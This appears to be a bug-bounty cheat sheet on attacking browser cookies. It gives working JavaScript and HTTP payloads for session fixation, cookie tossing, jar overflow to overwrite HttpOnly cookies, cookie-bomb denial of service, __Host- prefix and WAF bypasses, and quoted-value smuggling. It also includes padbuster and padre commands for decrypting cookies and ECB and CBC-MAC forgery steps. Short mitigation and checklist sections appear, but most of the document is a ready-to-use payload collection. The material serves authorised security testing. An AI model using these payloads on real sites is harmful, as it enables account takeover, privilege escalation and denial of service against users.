## Overview

Cookies are key-value pairs sent by servers to browsers for stateful authentication and access control. They contain session IDs, user data, or tokens that identify and authenticate users across requests.

**Core vulnerability:** Cookies stored client-side can be decoded, manipulated, or stolen—leading to session hijacking, account takeover, CSRF, fixation, and privilege escalation.

**Key concepts:**

- Browsers send cookies automatically with every request to matching domains
- Cookie attributes (Secure, HttpOnly, SameSite, Path, Domain) control security behavior
- Missing, weak, or bypassed protections = exploitable bugs
- Cookie prefixes (`__Host-`, `__Secure-`) enforce stricter security rules

---

## Cookie Attributes & Security

### Ultimate Secure Cookie

```http
Set-Cookie: __Host-SessionID=<value>;Path=/;Secure;HttpOnly;SameSite=Strict
```

### Attribute Breakdown

**Secure**

- Cookie only sent over HTTPS (except localhost)
- Protects confidentiality against MITM
- No integrity protection—can still be modified via disk access or JS

**HttpOnly**

- Blocks JavaScript access (`document.cookie`)
- Protects confidentiality only
- Can be overwritten via cookie jar overflow

**Path**

- Defines URL path required to send cookie
- `/docs` matches `/docs`, `/docs/`, `/docs/Web/`
- Used to isolate apps on same host

**Domain**

- If unspecified: current host only (no subdomains)
- If specified: includes all subdomains
- Example: `Domain=.example.com` sends to `sub.example.com`

**SameSite**

- `Strict`: Never sent on cross-site requests
- `Lax`: Sent on top-level GET navigation from external sites (default in Chrome)
- `None`: Sent everywhere (requires `Secure` flag)

**Expires / Max-Age**

- `Expires`: HTTP-date timestamp
- `Max-Age`: seconds until expiry (takes precedence)
- Missing = session cookie (browser decides session end)

### Cookie Prefixes

**`__Secure-`**

- Requires `Secure` flag

**`__Host-`**

- Requires `Secure` flag
- Requires `Path=/`
- Must NOT have `Domain` attribute
- Cannot be sent to subdomains

### Cookie Sorting (RFC6265)

Browser sends cookies in this order:

1. **Longer paths first**
2. **Earlier creation time first** (among equal-length paths)

**Attack:** Set cookie with longer path to override legitimate cookie if app uses first value.

---

## Exploitation Methods

### 1. Cookie Decoding & Manipulation

**Check for:**

- Base64/hex encoding
- Predictable patterns (username, role, email)
- Unencrypted sensitive data

**Steps:**

1. Capture cookie value
2. Decode (try base64, hex, URL encoding)
3. Modify values (change username, role, privileges)
4. Re-encode and replace cookie
5. Test access

**Example:**

```bash
echo "dXNlcj1hZG1pbg==" | base64 -d
# Output: user=admin

echo "user=superadmin" | base64
# Use new cookie value
```

---

### 2. Session Hijacking

**Goal:** Steal victim's cookie → impersonate victim

**Steps:**

1. Create account and log in
2. Use browser extension (EditThisCookie, Cookie Editor)
3. Copy all cookies
4. Log out
5. Paste stolen cookies
6. Refresh page

**Impact:** Full account takeover if cookies stolen via XSS, MITM, or phishing

---

### 3. Session Fixation

**Goal:** Force victim to use attacker's session cookie

**Steps:**

1. Visit `example.com/login`
2. Get `SESSION` cookie value from DevTools
3. Open incognito tab
4. Set cookie to stolen value in incognito
5. In normal tab: log in as victim
6. Refresh incognito tab → logged in as victim

**Requirements:**

- Session cookie not regenerated after login
- Application accepts pre-existing session IDs

---

### 4. Session Donation

**Goal:** Trick victim into using attacker's account

**Steps:**

1. Log in as attacker
2. Copy attacker's session cookie
3. Send cookie-setting link/payload to victim
4. Victim performs actions in attacker's account
5. Attacker views victim's data in own account

**Common in:** Account linking, OAuth flows

---

### 5. Cookie Tossing (Subdomain Takeover/XSS)

**Goal:** Set malicious cookie from subdomain to override parent domain cookie

**Requirements:**

- Control a subdomain OR XSS on subdomain

**Attack Vectors:**

**A. Session Fixation via Subdomain**

```javascript
document.cookie = "session=attacker_value; Domain=.example.com; Path=/"
```

**B. CSRF Token Override**

```javascript
// If CSRF token stored in cookie and not regenerated after login
document.cookie = "csrf_token=known_value; Domain=.example.com; Path=/app"
```

**C. Account Linking Hijack**

- Set attacker's cookie in OAuth callback endpoint
- Victim links their Git/social account to attacker's profile

**D. Cookie Bomb (DoS)**

```javascript
// Set massive cookies to cause request size limit exceeded
for (let i = 0; i < 50; i++) {
  document.cookie = `bomb${i}=${'A'.repeat(4000)}; Domain=.example.com`
}
```

**Cookie Priority Exploit:**

- Use longer `Path` to make attacker cookie sent first
- Example: `Path=/app/login/verify` overrides `Path=/`

**Defense Bypass:**

- **Cookie Jar Overflow:** Delete legit cookie by setting 700+ cookies
- **URL Encode Cookie Name:** `%63ookie=value` may bypass duplicate checks
- **Add Symbols:** `cookie%00=value`, `cookie%20=value`

---

### 6. Cookie Jar Overflow

**Goal:** Delete HttpOnly cookies or overflow to remove legit cookies

**Exploit:**

```javascript
// Set 700 cookies to overflow jar
for (let i = 0; i < 700; i++) {
  document.cookie = `cookie${i}=${i}; Secure`
}

// Now HttpOnly cookie is deleted—reset with your value
document.cookie = "session=attacker_value; Secure"

// Clean up
for (let i = 0; i < 700; i++) {
  document.cookie = `cookie${i}=${i};expires=Thu, 01 Jan 1970 00:00:01 GMT`
}
```

**Use cases:**

- Overwrite HttpOnly session cookies
- Remove CSRF tokens
- Clear security cookies before setting malicious ones

---

### 7. Cookie Bomb (Client-Side DoS)

**Goal:** Force user to send oversized requests → server rejects → DoS for that domain

**Exploit:**

```javascript
// From subdomain or XSS
for (let i = 0; i < 50; i++) {
  document.cookie = `bomb${i}=${'X'.repeat(4000)}; Domain=.example.com; Path=/`
}
```

**Impact:** User cannot access domain/subdomains until cookies cleared

---

### 8. Cookie Smuggling & Parsing Bugs

#### Empty Cookie Attack

```javascript
document.cookie = "a=v1"
document.cookie = "=test_value;" // Empty name cookie
document.cookie = "b=v2"

// Sent as: a=v1; test_value; b=v2;

// Now control another cookie:
document.cookie = "=a=malicious"
// Browser interprets as: a=malicious
```

#### Chrome Unicode Bug

```javascript
// Corrupts document.cookie permanently
document.cookie = "\ud800=meep"
// document.cookie now returns empty string
```

#### Cookie Sandwich (HttpOnly Bypass)

**Requirements:**

- Cookie reflected in response (HTML comment, debug info)

**Exploit:**

```javascript
document.cookie = `$Version=1;`
document.cookie = `param1="start` // Opens quote
// Victim's HttpOnly cookie gets sandwiched here
document.cookie = `param2=end";` // Closes quote

// param1 value now contains HttpOnly cookie when reflected
```

#### RFC2965 Quoted-Value Smuggling

**Servers affected:** Java (Jetty, Tomcat, Undertow), Python (Zope, cherrypy, web.py, aiohttp, bottle)

**Exploit:**

```http
Cookie: RENDER_TEXT="hello; JSESSIONID=attacker_token; ASDF=end";
```

- Server reads entire quoted value as one cookie
- May accept injected `JSESSIONID` inside quote

---

### 9. Cookie Prefix Bypasses

#### Unicode Whitespace Prefix Forgery

**Goal:** Bypass `__Host-` / `__Secure-` checks

**Exploit:**

```javascript
// Prepend Unicode whitespace (U+2000, U+0085, U+00A0)
document.cookie = `${String.fromCodePoint(0x2000)}__Host-name=injected; Domain=.example.com; Path=/;`
```

**Why it works:**

- Browser doesn't see literal `__Host-` prefix (has leading whitespace)
- Allows setting from subdomain
- Backend trims whitespace → normalizes to `__Host-name`
- Last cookie wins → attacker value overwrites legit cookie

**Test code points:** U+0085, U+00A0, U+1680, U+2000–U+200A, U+2028, U+2029, U+202F, U+205F, U+3000

#### Legacy `$Version=1` Cookie Splitting

**Servers affected:** Tomcat, Jetty, Undertow

**Exploit:**

```javascript
document.cookie = `$Version=1,__Host-name=injected; Path=/long/path/; Domain=.example.com;`
```

**Why it works:**

- Legacy RFC 2109/2965 parsing splits on comma
- Client-side prefix checks don't catch it
- Server-side parses as multiple cookies
- Attacker's `__Host-` cookie accepted

---

### 10. WAF Bypasses

#### $Version WAF Bypass

**Exploit:**

```http
Cookie: $Version=1; param=<payload>
```

- Forces old RFC2109 parsing
- May bypass WAF rules expecting modern format

**Additional attributes:** `$Domain`, `$Path`

#### Quoted-String Encoding Bypass

**Exploit:**

```javascript
// Blocked:
document.cookie = "param=eval('test')"

// Allowed (escaped):
document.cookie = `param="\\e\\v\\a\\l\\(\\'\\t\\e\\s\\t\\'\\)"`
// Server unescapes to: eval('test')
```

#### Cookie Name Blocklist Bypass

**Use comma separator (RFC2109):**

```http
Cookie: $Version=1; foo=bar, admin = qux
```

- Creates cookies: `foo=bar` and `admin=qux`
- Spaces around `=` are stripped

#### Cookie Splitting to Bypass Analysis

**Exploit:**

```http
Cookie: name=eval('test//
Cookie: comment')

# Server joins: name=eval('test//, comment')
```

---

### 11. Padding Oracle Attack (Padbuster)

**Goal:** Decrypt encrypted cookies

**Requirements:**

- CBC mode encryption
- Oracle error (padding invalid message)

**Exploit:**

```bash
# Decrypt cookie
padbuster http://target.com/index.php u7bvLewln6PJPSAbMb5pFfnCHSEd6olf 8 \
  -cookies auth=u7bvLewln6PJPSAbMb5pFfnCHSEd6olf \
  -error "Invalid padding"

# Encrypt custom value (e.g., user=administrator)
padbuster http://target.com/index.php <COOKIE> 8 \
  -cookies auth=<COOKIE> \
  -plaintext user=administrator
```

**Encoding options:** Use `-encoding 2` for hex/urlsafe base64

---

### 12. ECB Encryption Pattern Analysis

**Goal:** Identify block patterns in ECB-encrypted cookies

**Steps:**

1. Create users: `aaaaaaaaaaaa`, `bbbbbbbbbbbb`
2. Compare cookies for repeating patterns
3. Create user: `aaaaaaaaadmin` (block-aligned)
4. Extract encrypted block for "admin"
5. Replace encrypted username block with admin block

---

### 13. CBC-MAC Integrity Bypass

**Goal:** Forge valid signature for modified cookie

**Requirements:**

- Cookie signed with CBC-MAC
- Null IV used

**Attack:**

1. Get signature of `administ` = `t`
2. Get signature of `rator\x00\x00\x00 XOR t` = `t'`
3. Set cookie: `administrator+t'`
4. Server validates: `(rator\x00\x00\x00 XOR t) XOR t = rator\x00\x00\x00` ✓

---

### 14. Common Session Bugs

#### Old Session Persists After Password Change

**Steps:**

1. Log in on Chrome and Firefox
2. Change password in Chrome
3. Refresh Firefox

**Bug:** Still logged in → sessions not invalidated

#### Password Reset Token Not Expiring

**Steps:**

1. Request password reset
2. Don't use token
3. Change email via settings
4. Use old token sent to old email

**Bug:** Token still works

#### Cache Control Missing (Session Exposure)

**Steps:**

1. Log in and navigate pages
2. Log out
3. Press `Alt+Left Arrow`

**Bug:** Previous pages still visible (cached)

#### Email Verification Bypass via Email Swap

**Steps:**

1. Create account with Email A (don't verify)
2. Change email to Email B and verify
3. Change back to Email A

**Bug:** Email A now marked verified without ever clicking verification link

---

## Payloads

### Cookie Manipulation Payloads

```javascript
// 1. Set cookie from subdomain to parent
document.cookie = "session=attacker; Domain=.example.com; Path=/"

// 2. Cookie bomb
for (let i = 0; i < 50; i++) {
  document.cookie = `bomb${i}=${'X'.repeat(4000)}; Domain=.example.com`
}

// 3. Cookie jar overflow
for (let i = 0; i < 700; i++) {
  document.cookie = `overflow${i}=${i}; Secure`
}

// 4. Empty cookie injection
document.cookie = "=a=injected_value"

// 5. Cookie sandwich
document.cookie = `$Version=1;`
document.cookie = `param1="start`
document.cookie = `param2=end";`

// 6. Unicode whitespace prefix bypass
document.cookie = `${String.fromCodePoint(0x2000)}__Host-session=fake; Domain=.example.com; Path=/`

// 7. Legacy version splitting
document.cookie = `$Version=1,__Host-token=spoofed; Path=/long/; Domain=.example.com`

// 8. Quoted-string WAF bypass
document.cookie = `param="\\e\\v\\a\\l\\(\\'\\x\\s\\s\\'\\)"`

// 9. Cookie name comma separator
document.cookie = `$Version=1; foo=bar, admin = privileged`

// 10. Path priority override
document.cookie = "session=attacker; Path=/app/admin/settings" // Sent before Path=/
```

---

## Higher Impact Scenarios

### Account Takeover via Cookie Tossing

- Control subdomain or find XSS on subdomain
- Set attacker session cookie to parent domain
- Victim uses attacker's session
- Attacker gains access to victim actions/data

### Privilege Escalation via Cookie Manipulation

- Decode cookie revealing `role=user`
- Change to `role=admin`
- Access admin panels, sensitive data

### CSRF via Cookie Fixation

- Fixate CSRF token via cookie tossing
- Victim logs in (token not regenerated)
- Perform CSRF with known token

### Mass DoS via Cookie Bomb

- XSS on popular subdomain
- Deploy cookie bomb payload
- All users cannot access domain until cookies cleared

---

## Mitigations

### Secure Cookie Configuration

```http
Set-Cookie: __Host-SessionID=<random>; Path=/; Secure; HttpOnly; SameSite=Strict
```

### Key Protections

- **Always regenerate session ID after login**
- **Invalidate old sessions on password change**
- **Use `__Host-` prefix** (prevents subdomain tossing)
- **Set `SameSite=Strict`** for sensitive cookies
- **Never store sensitive data in cookies** (use server-side sessions)
- **Implement CSRF tokens** (separate from cookies)
- **Use short session timeouts** and idle timeouts
- **Validate cookie integrity** (HMAC signatures)
- **Monitor for duplicate cookie names** in requests
- **Reject cookies with suspicious attributes** ($Version, quotes, etc.)

### Framework-Level

- Trim/normalize cookie names carefully
- Reject RFC 2109/2965 legacy parsing
- Enforce strict cookie parsing (no quoted-value injection)
- Implement rate limiting on cookie-setting endpoints

---

## Testing Checklist

✅ **Basic Checks**

- [ ] Decode cookies (base64, hex, URL)
- [ ] Test if cookie same after re-login
- [ ] Log out → reuse old cookie
- [ ] Log in on 2 browsers with same cookie
- [ ] Check "Remember Me" functionality
- [ ] Change password → test old cookie

✅ **Attribute Checks**

- [ ] Missing `Secure` flag (test over HTTP)
- [ ] Missing `HttpOnly` (test `document.cookie`)
- [ ] Missing/weak `SameSite` (test CSRF)
- [ ] No `__Host-` prefix (test subdomain cookie tossing)

✅ **Advanced**

- [ ] Cookie jar overflow → overwrite HttpOnly
- [ ] Cookie tossing from subdomain
- [ ] Padding oracle (padbuster)
- [ ] Session fixation
- [ ] Cookie bomb DoS
- [ ] Unicode prefix bypass
- [ ] $Version legacy parsing bypass
- [ ] Cookie sandwich for HttpOnly exfil

---

## Tools

```bash
# Padbuster (padding oracle)
padbuster <URL> <COOKIE> <BLOCK_SIZE> -cookies "auth=<COOKIE>" -error "Invalid padding"

# Padre (alternative padding oracle)
padre -u 'https://target/profile' -cookie 'SESS=$' '<COOKIE_VALUE>'

# Browser Extensions
# - EditThisCookie
# - Cookie Editor

# Burp Suite
# - Bambda: CookiePrefixBypass.bambda
```

---

**You're locked in. Go hunt those cookie bugs. 🍪💀**